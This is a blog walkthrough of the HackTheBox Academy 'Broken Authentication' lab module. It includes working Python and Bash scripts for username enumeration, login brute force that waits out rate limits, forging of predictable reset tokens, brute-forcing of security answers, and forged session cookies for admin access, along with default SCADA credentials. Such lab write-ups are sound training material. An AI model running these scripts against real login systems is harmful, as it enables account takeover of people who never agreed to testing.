---
title: "[HTB_Academy] Broken Authentication"
excerpt: "**Broken Authentication** Module Walkthrough - HackTheBox Academy"
header:
  overlay_image: /assets/images/HTB_broken_authentication/banner.png
  teaser: /assets/images/HTB_broken_authentication/upper.jpg
  og_image: /assets/images/HTB_broken_authentication/upper.jpg
categories:
  - HTB-Academy
  - Bug Bounty Hunter
tags:
  - HTB-Academy
  - Bug Bounty Hunter
  - Web
  - Authentication
  - Cookies
  - Session
  - Brute Force
  - Python
  - Bash
layout: single
toc: true
---
![image-center](\assets\images\HTB_broken_authentication\upper.jpg)

## Disclaimer
<img style="float: left; padding-right:10px" src="\assets\images\disclaimer.png" width="110" height="110">

<div style="text-align: justify">The following post may contain spoilers. Use it as a guide or support. It is always better to try it by yourself!</div>
<div style="text-align: justify">Enjoy :)</div>

## Resources
<img style="float: left; padding-right:10px" src="\assets\images\github.avif" width="110" height="110">
<div style="text-align: justify">All resources can be found in the following GitHub repository:</div>
[R4fik1-HTB_broken_authentication_Repository](https://github.com/r4fik1/HTB_Academy/tree/main/HTB_broken_authentication)

## Module Summary
<div style="text-align: justify">This module covers common vulnerabilities and misconfigurations regarding Authentication that could be leveraged to gain unauthorized access to a web application. Specifically, in this module, we will cover:</div><br>

  - An overview of authentication methods
  - Common protection mechanisms and possible bypasses
  - Attacks against login processes
  - Attacks against credential handling

## Default Credentials

> **Q. Inspect the login page and perform a bruteforce attack. What is the valid username?**

<div style="text-align: justify">1. If we access the target and see that it is a login page.</div><br>
![image-center](\assets\images\HTB_broken_authentication\Q1\1.png)

<div style="text-align: justify">2. We inspect the source code of the login page and see that the title of the login page displays some interesting information: WebAccess HMI/SCADA Software. </div><br>
![image-center](\assets\images\HTB_broken_authentication\Q1\2.png)

<div style="text-align: justify">3. Doing a bit of searching on the internet, we found the following webpage, in which there are several default "usernames" and "passwords" for SCADA. </div><br>
[SCADA HMI Username/Password](https://www.192-168-1-1-ip.co/router/advantech/advantech-webaccess-browser-based-hmi-and-scada-software/11215/)
 
![image-center](\assets\images\HTB_broken_authentication\Q1\3.png)

<div style="text-align: justify">4. A brute force attack is performed using the Burpsuite tool. To do this, we first capture the login request and send it to the Burpsuite Intruder: </div><br>
![image-center](\assets\images\HTB_broken_authentication\Q1\4.png)

<div style="text-align: justify">5. In the intruder we select Cluster Bomb as Attack Type and the payload positions in the "Username" and "Password" values. </div><br>
![image-center](\assets\images\HTB_broken_authentication\Q1\5.png)

<div style="text-align: justify">6. In the payloads tab we enter the usernames and password from step 3, both in payload set 1 and in payload set 2 and we execute the attack. </div><br>
![image-center](\assets\images\HTB_broken_authentication\Q1\6.png)

<div style="text-align: justify">7. In the Burpsuite results we can see how one of the requests has a different length. </div><br>
![image-center](\assets\images\HTB_broken_authentication\Q1\7.png)

<div style="text-align: justify">8. If we access the answer, we see how the session has been started correctly and therefore we already have the username of the question: </div><br>
![image-center](\assets\images\HTB_broken_authentication\Q1\8.png)

## Weak Bruteforce Protections

>**Q. Observe the web application based at subdirectory /question1/ and infer rate limiting. What is the wait time imposed after an attacker hits the limit? (round to a 10-second timeframe, e.g., 10 or 20)**

<div style="text-align: justify">1. We click on question1 and see that it is a login page.</div><br>
![image-center](\assets\images\HTB_broken_authentication\Q2\1.1.png)

<div style="text-align: justify">2. Since the question asks us for the waiting time, we send the request to the Intruder in a similar way to the previous question.</div><br>
![image-center](\assets\images\HTB_broken_authentication\Q2\1.2.png)

<div style="text-align: justify">3. In Intruder we select "Snyper" as Attack Type and only the username or password as payload (in this example we will use the username).</div><br>
![image-center](\assets\images\HTB_broken_authentication\Q2\1.3.png)

<div style="text-align: justify">4. We introduce as payload a series of random values.</div><br>
![image-center](\assets\images\HTB_broken_authentication\Q2\1.4.png)

<div style="text-align: justify">5. We execute the attack and see how the length of the response changes at a given moment.</div><br>
![image-center](\assets\images\HTB_broken_authentication\Q2\1.5.png)

<div style="text-align: justify">6. Seeing the response of the first request with different length, we find out the timeout.</div><br>
![image-center](\assets\images\HTB_broken_authentication\Q2\1.6.png)

>**Q. Work on webapp at URL /question2/ and try to bypass the login form using one of the method showed. What is the flag?**

<div style="text-align: justify">1. Click on question2. Another login page.</div><br>
![image-center](\assets\images\HTB_broken_authentication\Q2\2.1.png)

<div style="text-align: justify">2. As a clue we know that the server does not trust our IP.</div><br>
![image-center](\assets\images\HTB_broken_authentication\Q2\2.2.png)

<div style="text-align: justify">3. We send the request to the Burpsuite Repeater.</div><br>
![image-center](\assets\images\HTB_broken_authentication\Q2\2.3.png)

<div style="text-align: justify">4. In the Repeater we add the "X-Forwarded-For" header with a specific IP (Hint: the server only trusts itself), send the request and get the flag.</div><br>
![image-center](\assets\images\HTB_broken_authentication\Q2\2.4.png)

## Brute Forcing Usernames

>**Q. Find the valid username on the web app based at the /question1/ subdirectory. PLEASE NOTE: Use the same wordlist for all four questions.**

<div style="text-align: justify">1. Click on question1.</div><br>
![image-center](\assets\images\HTB_broken_authentication\Q3\1.1.png)

<div style="text-align: justify">2. We capture the request with Burpsuite and send it to the Intruder.</div><br>
![image-center](\assets\images\HTB_broken_authentication\Q3\1.2.png)

<div style="text-align: justify">3. In the Intruder we select "Snyper" as the attack type and the payload position will be the username.</div><br>
![image-center](\assets\images\HTB_broken_authentication\Q3\1.3.png)

<div style="text-align: justify">4. As payload we use the following list which can be downloaded from the following link:</div> [SecLists](https://github.com/danielmiessler/SecLists)

```bash
cat /SecLists/Usernames/top-usernames-shortlist.txt
```

![image-center](\assets\images\HTB_broken_authentication\Q3\1.4.1.png)

![image-center](\assets\images\HTB_broken_authentication\Q3\1.4.2.png)

<div style="text-align: justify">5. We run the Intruder and see that there is a request with a different length.</div><br>
![image-center](\assets\images\HTB_broken_authentication\Q3\1.5.png)

<div style="text-align: justify">6. Reply with invalid user.</div><br>
![image-center](\assets\images\HTB_broken_authentication\Q3\1.6.png)

<div style="text-align: justify">7. Answer with different length. We see that the user is valid and therefore we have the answer to the question.</div><br>
![image-center](\assets\images\HTB_broken_authentication\Q3\1.7.png)

>**Q. Find the valid username for the web application based at subdirectory /question2/.**

<div style="text-align: justify">1. Click on question2.</div><br>
![image-center](\assets\images\HTB_broken_authentication\Q3\2.1.png)

<div style="text-align: justify">2. This is a more manual question. To find out what the username is, we must enter the usernames from the list of the first question one by one and see if anything changes in the requests captured in Burpsuite. In the following images we see how a request shows us a "wronguser" parameter and the other request the "validuser" parameter.</div><br>
![image-center](\assets\images\HTB_broken_authentication\Q3\2.2.png)

![image-center](\assets\images\HTB_broken_authentication\Q3\2.3.png)

>**Q. Find the valid account name for the web application based at subdirectory /question3/.**

<div style="text-align: justify">1. We access the target by clicking on question3 and we see that it is a login like the previous ones. In this case we ignore the hint and use the following python script. You have to change the IP and the PORT for the corresponding one.</div><br>
![image-center](\assets\images\HTB_broken_authentication\Q3\3.2.png)

```python
import sys
import requests
import os.path

# define target url, change as needed
url = "http://IP:PORT/question3/"

# define a fake headers to present ourself as Chromium browser, change if needed
headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36"}

# define the string expected if valid account has been found. our basic PHP example replies with Welcome in case of success

valid = "Welcome"

"""
wordlist is expected as simple list, we keep this function to have it ready if needed.
for this test we are using /opt/useful/SecLists/Usernames/top-usernames-shortlist.txt
change this function if your wordlist has a different format
"""
def unpack(fline):
    userid = fline
    passwd = 'foobar'

    return userid, passwd

"""
our PHP example accepts requests via POST, and requires parameters as userid and passwd
"""
def do_req(url, userid, passwd, headers):
    data = {"userid": userid, "passwd": passwd, "submit": "submit"}
    res = requests.post(url, headers=headers, data=data)
    print("[+] user {:15} took {}".format(userid, res.elapsed.total_seconds()))

    return res.text

def main():
    # check if this script has been runned with an argument, and the argument exists and is a file
    if (len(sys.argv) > 1) and (os.path.isfile(sys.argv[1])):
        fname = sys.argv[1]
    else:
        print("[!] Please check wordlist.")
        print("[-] Usage: python3 {} /path/to/wordlist".format(sys.argv[0]))
        sys.exit()

    # open the file, this is our wordlist
    with open(fname) as fh:
        # read file line by line
        for fline in fh:
            # skip line if it starts with a comment
            if fline.startswith("#"):
                continue
            # use unpack() function to extract userid and password from wordlist, removing trailing newline
            userid, passwd = unpack(fline.rstrip())

            # call do_req() to do the HTTP request
            print("[-] Checking account {} {}".format(userid, passwd))
            res = do_req(url, userid, passwd, headers)

if __name__ == "__main__":
    main()
```

<div style="text-align: justify">2. We run the script and see that there is a request that takes more time and therefore it is the answer.</div><br>
![image-center](\assets\images\HTB_broken_authentication\Q3\3.3.png)

>**Q. Now find another way to discover the valid username for the web application based at subdirectory /question4/.**

<div style="text-align: justify">1. We access the objective by clicking on question4 and we see that there is a field to create an account, we click.</div><br>
![image-center](\assets\images\HTB_broken_authentication\Q3\4.1.png)

<div style="text-align: justify">2. It is a form with different fields, we fill them in and click on submit to be able to capture the request in Burpsuite.</div><br>
![image-center](\assets\images\HTB_broken_authentication\Q3\4.2.png)

<div style="text-align: justify">3. We send the request to the Intruder and select the username as the payload position. As payload we use the list from the first question.</div><br>
![image-center](\assets\images\HTB_broken_authentication\Q3\4.3.png)

<div style="text-align: justify">4. We run the Intruder and see that there is a request with a longer length.</div><br>
![image-center](\assets\images\HTB_broken_authentication\Q3\4.4.png)

<div style="text-align: justify">5. We check in the response that the user corresponding to the request sent exists and we obtain the answer to the question.</div><br>
![image-center](\assets\images\HTB_broken_authentication\Q3\4.5.png)

## Brute Forcing Passwords

>**Q. Using rockyou-50.txt as password wordlist and htbuser as the username, find the policy and filter out strings that don't respect it. What is the valid password for the htbuser account?**
<div style="text-align: justify">1. For this question we are entering different random passwords to check the password complexity filter. We see that a password with numbers and capital letters is requested. We use the following grep with rockyou-50.txt to get a list that we will use in the Intruder.</div>

```bash
grep '[[:upper:]]' /home/marcos/htb-academy/broken_authentication/SecLists-master/Passwords/Leaked-Databases/rockyou-50.txt | grep -E '[0-9]{1,4}'
```

![image-center](\assets\images\HTB_broken_authentication\Q4\1.png)

![image-center](\assets\images\HTB_broken_authentication\Q4\2.png)

<div style="text-align: justify">2. Since there is a timeout when entering the wrong password multiple times, we run the intruder in chunks (4 or 5 payloads each time).</div><br>
![image-center](\assets\images\HTB_broken_authentication\Q4\3.png)

<div style="text-align: justify">3. As the first 5 payloads have not worked, we remove them from the payload list and run the Intruder again.</div><br>
![image-center](\assets\images\HTB_broken_authentication\Q4\4.png)

<div style="text-align: justify">4. The previous step is repeated until we see the length of our request change.</div><br>
![image-center](\assets\images\HTB_broken_authentication\Q4\5.png)




## Predictable Reset Token

>**Q. Create a token on the web application exposed at subdirectory /question1/ using the *Create a reset token for htbuser* button. Within an interval of +-1 second a token for the htbadmin user will also be created. The algorithm used to generate both tokens is the same as the one shown when talking about the Apache OpenMeeting bug. Forge a valid token for htbadmin and login by pressing the "Check" button. What is the flag?**

<div style="text-align: justify">1. To solve this question we need to modify the reset_token_time.py script to generate tokens within +/- two seconds of the time shown in the target. For this we access the following webpage:</div> [EpochConverter](https://www.epochconverter.com/)

<div style="text-align: justify">2. We introduce the time that the target "And has been created at" shows us and we generate the "Epoch timestamp in milliseconds". We do this process with +/-2 seconds and fill in the "now", "start_time" and "end_time" variables in the script.</div>

```python
#!/usr/bin/python3

from hashlib import md5
import requests
from sys import exit
from time import time

# Change the url to your target / victim
url = "http://IP:PORT/question1/"

# To have a wide window try to bruteforce starting from 1050 seconds ago till 1050 seconds after.
# Change now and username variables as needed. IMPORTANT! the value for now has to be epoch time
# stamp in milliseconds, example 1654627487000 and not epoch timestamp, example 1654627487.

now        = 1675437483000
start_time = 1675438899000 #-2 seconds
end_time   = 1675438903000 #+2 seconds
fail_text  = "Wrong token"
username   = "htbadmin"

# loop from start_time to now. + 1 is needed because of how range() works
for x in range(start_time, end_time + 1):
    # get token md5
    timestamp = str(x)
    md5_token = md5((username+timestamp).encode()).hexdigest()
    data = {
        "submit": "check",
        "token": md5_token
    }

    print("checking {} {}".format(str(x), md5_token))

    # send the request
    res = requests.post(url, data=data)

    # response text check
    if not fail_text in res.text:
        print(res.text)
        print("[*] Congratulations! raw reply printed before")
        exit()
```

<div style="text-align: justify">3. We run the script, wait and get the flag.</div>

```sh
python3 user.py
```

![image-center](\assets\images\HTB_broken_authentication\Q5\1.png)

>**Q. Request a reset token for htbuser and find the encoding algorithm, then request a reset token for htbadmin to force a password change and forge a valid temp password to login. What is the flag?**

<div style="text-align: justify">1. Click on "Show temporary password for htbuser user".</div><br>
![image-center](\assets\images\HTB_broken_authentication\Q5\4.1.png)

<div style="text-align: justify">2. We capture the request in order to have the token.</div><br>
![image-center](\assets\images\HTB_broken_authentication\Q5\4.2.png)

<div style="text-align: justify">3. We introduce the token in the Burpsuite Decoder and decode the token first in Base64 and the result in ASCII Hex. We see that we can modify that password.</div><br>
![image-center](\assets\images\HTB_broken_authentication\Q5\4.3.png)

<div style="text-align: justify">4. We changed "htbuser" to "htbadmin" in password decrypted in the previous step. We encode the string, first in ASCII Hex and the result in Base64.</div><br>
![image-center](\assets\images\HTB_broken_authentication\Q5\4.4.png)

<div style="text-align: justify">5. We capture the login request and send it to the Repeater.</div><br>
![image-center](\assets\images\HTB_broken_authentication\Q5\4.5.png)

<div style="text-align: justify">6. In the Repeater we change the userid to "htbadmin" and as passwd we use the token from step four. We get the flag.</div><br>
![image-center](\assets\images\HTB_broken_authentication\Q5\4.6.png)

## Guessable Answers

>**Q. Reset the htbadmin user's password by guessing one of the questions. What is the flag?**

<div style="text-align: justify">1. We access the target and introduce the user "htbadmin".</div><br>
![image-center](\assets\images\HTB_broken_authentication\Q6\1.png)

<div style="text-align: justify">2. We enter random answers in "Reset your password" until we find the question "What is your favorite color?"</div><br>
![image-center](\assets\images\HTB_broken_authentication\Q6\2.png)

<div style="text-align: justify">3. We modify the following python script to point to our target url and to the correct question from the previous step.</div>

```python
import sys
import requests
import os.path

# target url, change as needed
url = "http://IP:PORT/forgot.php"

# fake headers to present ourself as Chromium browser, change if needed
headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36"}

# string expected if the answer is wrong
invalid = "Sorry, wrong answer"

# question to bruteforce
question = "What is your favourite color?"


# wordlist is expected as one word per line, function kept to let you to parse different wordlist format keeping the code clean
def unpack(fline):
    answer = fline

    return answer

# do the web request, change data as needed
def do_req(url, answer, headers):
    # closely inspect POST data sent using any intercepting proxy to create a valid data
    data = {"answer": answer, "question": question, "userid": "htbadmin", "submit": "answer"}
    res = requests.post(url, headers=headers, data=data)

    return res.text

# pretending we just know the message received when the answer is wrong, we flip the check
def check(haystack, needle):
    # if our invalid string is found in response body return False
    if needle in haystack:
        return False
    else:
        return True

def main():
    # check if wordlist has been given and exists
    if (len(sys.argv) > 1) and (os.path.isfile(sys.argv[1])):
        fname = sys.argv[1]
    else:
        print("[!] Please check wordlist.")
        print("[-] Usage: python3 {} /path/to/wordlist".format(sys.argv[0]))
        sys.exit()

    # open the file
    with open(fname) as fh:
        for fline in fh:
            # skip line if starts with a comment
            if fline.startswith("#"):
                continue
            # extract userid and password from wordlist, removing trailing newline
            answer = unpack(fline.rstrip())

            # do HTTP request
            print("[-] Checking word {}".format(answer))<!-- 
            res = do_req(url, answer, headers)

            # check if response text matches our content
            #print(res)
            if (check(res, invalid)):
                print("[+] Valid answer found: {}".format(answer))
                sys.exit()

if __name__ == "__main__":
    main() -->
```

<div style="text-align: justify">4. We execute the script with the list "htm-colors.txt" that we can find in:</div> [SecLists](https://github.com/danielmiessler/SecLists)

```sh
python3 reset_password.py /home/marcos/htb-academy/broken_authentication/SecLists-master/Miscellaneous/security-question-answers/html-colors.txt
```
![image-center](\assets\images\HTB_broken_authentication\Q6\4.png)

<div style="text-align: justify">5. The script gives us the correct answer to the question. We put the response in the target and get the flag.</div><br>
![image-center](\assets\images\HTB_broken_authentication\Q6\5.png)

## Username Injection

>**Q. Login with the credentials "htbuser:htbuser" and abuse the reset password function to escalate to "htbadmin" user. What is the flag?**
<div style="text-align: justify">1. We start session with the credentials "htbuser:htbuser".</div><br>
![image-center](\assets\images\HTB_broken_authentication\Q7\1.1.png)

<div style="text-align: justify">2. We capture the above request and look at the parameters, especially the "userid".</div><br>
![image-center](\assets\images\HTB_broken_authentication\Q7\1.2.png)

<div style="text-align: justify">3. Once we have logged in, we can change the password. We do it to be able to capture the request.</div><br>
![image-center](\assets\images\HTB_broken_authentication\Q7\2.1.png)

<div style="text-align: justify">4. We send the request to Repeater.</div><br>
![image-center](\assets\images\HTB_broken_authentication\Q7\2.2.png)

<div style="text-align: justify">5. We copy the parameter "userid".</div><br>
![image-center](\assets\images\HTB_broken_authentication\Q7\3.1.png)

<div style="text-align: justify">6. And we paste it in the request to change password but changing the "userid" to "htbadmin" and we send the request. At this time we have changed the password of "htbadmin".</div><br>
![image-center](\assets\images\HTB_broken_authentication\Q7\4.png)

<div style="text-align: justify">7. We start the "htbadmin" session with the password used in the previous step and get the flag.</div><br>
![image-center](\assets\images\HTB_broken_authentication\Q7\5.png)

## Brute Forcing Cookies

>**Q. Tamper the session cookie for the application at subdirectory /question1/ to give yourself access as a super user. What is the flag?**

<div style="text-align: justify">1. We access the target and see that the user role is "student". We go to developer tools/storage to capture the cookie.</div><br>
![image-center](\assets\images\HTB_broken_authentication\Q8\1.png)

<div style="text-align: justify">2. Paste the cookie in Burpsuite Decoder and change the "=" symbol to "%3D".</div><br>
![image-center](\assets\images\HTB_broken_authentication\Q8\2.png)

<div style="text-align: justify">3. We decode the cookie as Base64 and then ASCII Hex and see the cookie in plain text.</div><br>
![image-center](\assets\images\HTB_broken_authentication\Q8\3.png)

<div style="text-align: justify">4. We change the role to "super" and encode first as ASCII Hex and then as Base64.</div><br>
![image-center](\assets\images\HTB_broken_authentication\Q8\4.png)

<div style="text-align: justify">5. We copy the cookie and paste it in the session started previously. We refresh the web page and get the flag.</div><br>
![image-center](\assets\images\HTB_broken_authentication\Q8\5.png)

>**Q. Log in to the target application and tamper the rememberme token to give yourself super user privileges. After escalating privileges, submit the flag as your answer.**

<div style="text-align: justify">1. Enter the provided credentials and click on the "Remember me" box.</div><br>
![image-center](\assets\images\HTB_broken_authentication\Q8\6.png)

<div style="text-align: justify">2. We see that there is a persistent cookie.</div><br>
![image-center](\assets\images\HTB_broken_authentication\Q8\7.png)

<div style="text-align: justify">3. We use the website:</div> [CyberChef](https://gchq.github.io/)
<div style="text-align: justify">Decode the cookie first at Base64 and then at Hex and see what the first two characters are.</div><br>
![image-center](\assets\images\HTB_broken_authentication\Q8\8.png)

<div style="text-align: justify">4. We look for those two characters in following wikipage and verify that it is "zlib" extension:</div> [List_of_file_signatures](https://en.wikipedia.org/wiki/List_of_file_signatures) 

![image-center](\assets\images\HTB_broken_authentication\Q8\9.png)

<div style="text-align: justify">5. We decode the cookie first from Base64, clicking on "Remove non-aphabet chars" and then on Zlib inflat as shown in the image. We see the cookie in plain text with the user "htbuser" and the role "student".</div><br>
![image-center](\assets\images\HTB_broken_authentication\Q8\10.png)

<div style="text-align: justify">6. We perform the reverse process to the previous step with user "htbadmin" and role "super" to obtain the cookie.</div><br>
![image-center](\assets\images\HTB_broken_authentication\Q8\11.png)

<div style="text-align: justify">7. We introduce the cookie in the persistent cookie value and update getting the flag.</div><br>
![image-center](\assets\images\HTB_broken_authentication\Q8\12.png)


## Skill Assessment - Broken Authentication

>**Q. Assess the web application and use various techniques to escalate to a privileged user and find a flag in the admin panel. Submit the contents of the flag as your answer.**

<div style="text-align: justify">1. We access the target and see that it is a login.</div><br>
![image-center](\assets\images\HTB_broken_authentication\Q9\1.png)

<div style="text-align: justify">2. Click on create account.</div><br>
![image-center](\assets\images\HTB_broken_authentication\Q9\2.png)

<div style="text-align: justify">3. We fill in the fields.</div><br>
![image-center](\assets\images\HTB_broken_authentication\Q9\3.png)

<div style="text-align: justify">4. We see that the password needs a series of requirements.</div><br>
![image-center](\assets\images\HTB_broken_authentication\Q9\4.png)
![image-center](\assets\images\HTB_broken_authentication\Q9\5.png)
![image-center](\assets\images\HTB_broken_authentication\Q9\6.png)
![image-center](\assets\images\HTB_broken_authentication\Q9\7.png)

<div style="text-align: justify">5. Once we meet the password requirements, we get our account and can log in.</div><br>
![image-center](\assets\images\HTB_broken_authentication\Q9\8.png)
![image-center](\assets\images\HTB_broken_authentication\Q9\9.png)

<div style="text-align: justify">6. Access the support page and see an important clue related to the support account and other support accounts with country codes.</div><br>
![image-center](\assets\images\HTB_broken_authentication\Q9\10.png)

<div style="text-align: justify">7. On the messages page we see if we can send a message to other users. We check that if the user does not exist an error is displayed, however if the user exists the message is sent.</div><br>
![image-center](\assets\images\HTB_broken_authentication\Q9\12.png)
![image-center](\assets\images\HTB_broken_authentication\Q9\11.png)

<div style="text-align: justify">8. I created a python script to concatenate suffixes and prefixes in different ways so that we can bruteforce "messages.php".</div>

```python
import itertools
import numpy

# user we want concatenate
user = 'support'
 
# Append suffix / prefix to user
arch = open('/home/marcos/htb-academy/broken_authentication/SecLists-master/Fuz>

for linea in arch:
    pre_user = [user + linea.rstrip()]
    print (''.join(pre_user))
    sub_user = [linea.rstrip() + user]
    print (''.join(sub_user))
    dot_user = [user + '.' + linea.rstrip()]
    print (''.join(dot_user))


arch.close()
```

<div style="text-align: justify">9. We run the script as follows:</div>

```sh
python3 concatenate.py > list.txt
```

<div style="text-align: justify">10. And get a list with the user "support" and different prefixes and suffixes with the country code.</div><br>
![image-center](\assets\images\HTB_broken_authentication\Q9\13.png)

<div style="text-align: justify">11. I create a script in python that with the previous list, the cookie of our logged in user and pointing to messages.php, will return a list of valid users.</div>

```python
import requests
import time

# file that contain user:pass
user_file = "list.txt"

# create url using user and password as argument
url = "http://178.128.171.82:31442/messages.php"
cookies = {'htb_sessid': 'YTAzMTRmNWU1Mjg5ZWYzYjNlZTY5Y2U1NmFjNGZkOWM%3D'}

# read user file 
with open(user_file, "r") as fh:
    for fline in fh:
        # skip comment
        if fline.startswith("#"):
            continue

        username = fline.rstrip()
        message = "a"
        submit = "submit"

        # prepare POST data
        data = {
            "user": username,
            "message": message,
            "submit": submit
        }
        
        # do the request
        res = requests.post(url, data=data, cookies=cookies)

        # print only valid usernames
        if "Message sent" in res.text:
            print("[+] Valid username: user:{}".format(username))
 ```

<div style="text-align: justify">12. See the list of valid users after executing the following command.</div>

```sh
python3 brute_force_messages.py
```
![image-center](\assets\images\HTB_broken_authentication\Q9\14.png)

<div style="text-align: justify">13. I create a bash script to filter the passwords according to the requirements that we have discovered when creating our account.</div>

```sh
#!/bin/bash
grep -E '^[A-Z]' /usr/share/wordlists/rockyou.txt | grep '[0-9]$' | grep '[^A-Za-z0-9]' | awk 'length >= 20 && length <= 29'
```
<div style="text-align: justify">14. Run the script and save the passwords in "pass.txt".</div>

```sh
./password_filter.sh > pass.txt
```
![image-center](\assets\images\HTB_broken_authentication\Q9\15.png)

<div style="text-align: justify">15. Now we modify the rate_limit_check.py script to bruteforce the login with the previously discovered users and the passwords leaked in the previous step. In this case we will use "support.us".</div>

```python
import requests
import time

# file that contain user:pass
pass_file = "pass.txt"

# create url using user and password as argument
url = "http://178.128.171.82:31442/login.php"

# rate limit blocks for 30 seconds
lock_time = 31

# message that alert us we hit rate limit
lock_message = "Too many login failures"

# read and password
with open(pass_file, "r") as fh:
    for fline in fh:
        # skip comment
        if fline.startswith("#"):
            continue

        username = "support.us"
        password = fline.rstrip()
        submit = "submit"

        # prepare POST data
        data = {
            "userid": username,
            "passwd": password,
            "submit": submit
        }
        
        # do the request
        res = requests.post(url, data=data)
        
        # handle generic credential error
        if "Invalid credentials" in res.text:
            print("[-] Invalid credentials: userid:{} passwd:{}".format(username, password))
        # hit rate limit, let's say we have to wait 30 seconds
        elif lock_message in res.text:
            print("[-] Hit rate limit, sleeping 30")
            # do the actual sleep plus 0.5 to be sure
            time.sleep(lock_time+0.5)
        else:
            print("[+] Valid credentials: userid:{} passwd:{}".format(username, password))
```

<div style="text-align: justify">16. Run the script and find a password for "support.us" (this step can be done for any support user).</div>

```sh
python3 rate_limit_check_FA.py
```

![image-center](\assets\images\HTB_broken_authentication\Q9\16.png)

<div style="text-align: justify">17. Log in with the user support.us and the password found in the previous step.</div><br>
![image-center](\assets\images\HTB_broken_authentication\Q9\17.png)

<div style="text-align: justify">18. Now we open the developer tools in the browser and click on the storage tab. Let's analyze the cookie.</div><br>
![image-center](\assets\images\HTB_broken_authentication\Q9\18.png)

<div style="text-align: justify">19. Download and install the Decode tool, and with it we decode the cookie.</div> [Decodify](https://github.com/s0md3v/Decodify)

```sh
python3 dcode "cookie"
```

![image-center](\assets\images\HTB_broken_authentication\Q9\19.png)

<div style="text-align: justify">20. In the decoded cookie we see how there is ":" between two strings. We proceed to decode each side.</div>
<div style="text-align: justify">md5->base64->urlencode</div><br>
![image-center](\assets\images\HTB_broken_authentication\Q9\20.png)

<div style="text-align: justify">21. Proceed to search if there are administrator users. To do this, we go to the messages tab and proceed in the same way as with the support user, that is, adding a country code suffix. In this case "admin.us". (For this step we can reuse the previous scripts if necessary). See that the user exists so we proceed to build a cookie similar to "support.us". Use the fields "admin.us:admin", encode the string at md5, then at base64 and finally at URLENCODE.</div><br>
![image-center](\assets\images\HTB_broken_authentication\Q9\21.png)

<div style="text-align: justify">22. I create a script that, when we pass the user and the role as parameters, performs the previous process and returns the string encoded at Base64.</div>

```sh
#!/bin/bash

word1=$1
word2=$2

word1_md5=$(echo -n "${word1}" | md5sum | cut -d ' ' -f 1)
word2_md5=$(echo -n "${word2}" | md5sum | cut -d ' ' -f 1)
word=$(echo -n "$word1_md5:$word2_md5")
word_base64=$(echo -n "${word}" | base64)

echo "$word_base64"
```

<div style="text-align: justify">23. Run the script and get the string at base64.</div>

```sh
./encrypt_md5_base64.sh admin.us adm
```
![image-center](\assets\images\HTB_broken_authentication\Q9\22.png)

<div style="text-align: justify">23. In CyberChef we introduce the previous string and encode it with URLENCODE, checking the box "Encode all special chars".</div>
[CyberChef](https://gchq.github.io/)<br>

![image-center](\assets\images\HTB_broken_authentication\Q9\23.png)

<div style="text-align: justify">24. We copy the generated string and go to the browser. In developer tools/storage/cookies, we change the value of the "htb_sessid" cookie to the one generated in the previous step. We refresh the page and get the flag.</div><br>
![image-center](\assets\images\HTB_broken_authentication\Q9\24.png)